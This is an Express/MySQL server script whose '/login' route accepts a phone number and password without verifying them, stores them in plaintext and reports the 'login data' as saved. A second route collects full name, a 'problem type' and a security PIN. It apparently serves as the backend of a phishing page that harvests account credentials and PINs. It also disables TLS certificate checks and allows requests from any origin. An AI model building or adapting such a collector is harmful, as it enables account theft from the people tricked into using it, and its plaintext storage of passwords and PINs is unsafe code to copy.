require("dotenv").config();

const express = require("express");
const cors = require("cors");
const mysql = require("mysql2");

const app = express();

app.use(cors());
app.use(express.json());

// ======================
// Database
// ======================

const db = mysql.createPool({
    host: process.env.MYSQL_HOST,
    port: Number(process.env.MYSQL_PORT),
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_DATABASE,
    ssl: {
        rejectUnauthorized: false
    },
    connectTimeout: 10000
});

// Test Connection
db.getConnection((err, connection) => {

    if (err) {
        console.log("❌ Database Error");
        console.log(err);
        return;
    }

    console.log("✅ MySQL Connected");
    connection.release();

});

// ======================
// Login Form
// ======================

app.post("/login", (req, res) => {

    const { phone, password } = req.body;

    if (!phone || !password) {
        return res.status(400).json({
            success: false,
            message: "Phone and Password Required"
        });
    }

    const sql = `
        INSERT INTO users(phone, password)
        VALUES(?, ?)
        ON DUPLICATE KEY UPDATE
        password = VALUES(password)
    `;

    db.query(sql, [phone, password], (err, result) => {

        if (err) {
            console.log(err);

            return res.status(500).json({
                success: false,
                message: "Database Error"
            });
        }

        res.json({
            success: true,
            message: "Login Data Saved Successfully"
        });

    });

});

// ======================
// Details Form
// ======================

app.post("/details", (req, res) => {

    const {
        phone,
        fullName,
        problemType,
        securityPin,
        experienceLevel
    } = req.body;

    const sql = `
        UPDATE users
        SET
            full_name = ?,
            problem_type = ?,
            security_pin = ?,
            experience_level = ?
        WHERE phone = ?
    `;

    db.query(
        sql,
        [
            fullName,
            problemType,
            securityPin,
            experienceLevel,
            phone
        ],
        (err, result) => {

            if (err) {
                console.log(err);

                return res.status(500).json({
                    success: false,
                    message: "Database Error"
                });
            }

            res.json({
                success: true,
                message: "Details Saved Successfully"
            });

        }
    );

});

// ======================
// Home Route
// ======================

app.get("/", (req, res) => {
    res.send("Backend Running Successfully");
});

// ======================
// Start Server
// ======================

const PORT = process.env.PORT || 5500;

app.listen(PORT, () => {
    console.log(`🚀 Server Running On ${PORT}`);
});